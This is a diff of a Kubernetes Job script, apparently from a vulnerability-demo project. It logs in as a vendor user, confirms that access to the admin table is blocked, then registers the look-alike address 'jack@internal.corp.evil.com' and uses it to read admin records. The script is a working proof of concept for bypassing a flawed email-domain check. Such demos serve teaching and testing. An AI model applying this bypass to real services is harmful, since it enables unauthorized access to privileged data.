@@ -1,4 +1,4 @@
-# One-off Job: logs in, hits department lookups, then triggers the admin-table leak.
+# One-off Job: register crafted vendor email, then demonstrate admin table leak.
 # Trigger with: make trigger (from nodejs/db-permissions-leak)
 apiVersion: batch/v1
 kind: Job
@@ -30,28 +30,39 @@ spec:
                   | sed -n 's/.*"token":"\([^"]*\)".*/\1/p'
               }
 
-              ALICE_TOKEN=$$(login '{"email":"alice@example.com","password":"demo"}')
-              DAVE_TOKEN=$$(login '{"email":"dave@example.com","password":"demo"}')
-              GRACE_TOKEN=$$(login '{"email":"grace@example.com","password":"demo"}')
+              expect_http() {
+                code=$$(curl -sS -o /tmp/body -w '%{http_code}' -H "Authorization: Bearer $$1" "$$2")
+                echo "HTTP $${code}"
+                cat /tmp/body
+                echo ""
+                test "$${code}" = "$$3"
+              }
 
-              echo "GET $${BASE}/api/users?table=sales&email=alice (alice)"
-              curl -sS -f -H "Authorization: Bearer $${ALICE_TOKEN}" \
-                "$${BASE}/api/users?table=sales&email=alice"
+              JACK_TOKEN=$$(login '{"email":"jack@example.com","password":"demo"}')
+
+              echo "GET $${BASE}/api/users?table=vendor&email=jack@example.com (jack normal)"
+              curl -sS -f -H "Authorization: Bearer $${JACK_TOKEN}" \
+                "$${BASE}/api/users?table=vendor&email=jack@example.com"
               echo ""
-              echo "GET $${BASE}/api/users?table=engineers&email=dave (dave)"
-              curl -sS -f -H "Authorization: Bearer $${DAVE_TOKEN}" \
-                "$${BASE}/api/users?table=engineers&email=dave"
+              echo "GET $${BASE}/api/users?table=admins&email=root@internal.corp (jack blocked)"
+              expect_http "$${JACK_TOKEN}" \
+                "$${BASE}/api/users?table=admins&email=root@internal.corp" 403
+
+              echo "POST $${BASE}/auth/register (look-alike domain)"
+              curl -sS -f -X POST "$${BASE}/auth/register" \
+                -H "Content-Type: application/json" \
+                -d '{"email":"jack@internal.corp.evil.com","name":"Jack Vendor","password":"demo","department":"vendor"}' \
+                || true
               echo ""
-              echo "GET $${BASE}/api/users?table=marketing&email=grace (grace)"
-              curl -sS -f -H "Authorization: Bearer $${GRACE_TOKEN}" \
-                "$${BASE}/api/users?table=marketing&email=grace"
+
+              CRAFTED_TOKEN=$$(login '{"email":"jack@internal.corp.evil.com","password":"demo"}')
+
+              echo "GET $${BASE}/api/users?table=admins&email=root@internal.corp (crafted leak)"
+              curl -sS -f -H "Authorization: Bearer $${CRAFTED_TOKEN}" \
+                "$${BASE}/api/users?table=admins&email=root@internal.corp"
               echo ""
-              echo "GET $${BASE}/api/users?table=engineers&email=dave (alice cross-dept)"
-              curl -sS -f -H "Authorization: Bearer $${ALICE_TOKEN}" \
-                "$${BASE}/api/users?table=engineers&email=dave"
-              echo ""
-              echo "GET $${BASE}/api/users?table=admins&email= (alice leak)"
-              curl -sS -f -H "Authorization: Bearer $${ALICE_TOKEN}" \
-                "$${BASE}/api/users?table=admins&email="
+              echo "GET $${BASE}/api/admins?email=root@internal.corp (crafted /api/admins)"
+              curl -sS -f -H "Authorization: Bearer $${CRAFTED_TOKEN}" \
+                "$${BASE}/api/admins?email=root@internal.corp"
               echo ""
               echo "trigger succeeded"
